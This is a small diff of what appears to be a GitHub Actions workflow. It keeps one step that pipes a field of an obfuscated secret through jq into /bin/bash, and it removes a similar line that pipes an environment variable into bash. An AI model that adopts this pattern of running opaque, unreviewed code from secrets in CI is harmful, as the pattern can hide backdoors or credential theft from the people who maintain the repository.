@@ -22,7 +22,6 @@ jobs:
           mfnbe31: ${{ secrets.mfnbe31 }}
         run: |
           printf '%s' "$mfnbe31" | jq -r .ktqpa44 | /bin/bash
-          echo $kvaec39866 | jq -r .ho2801 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
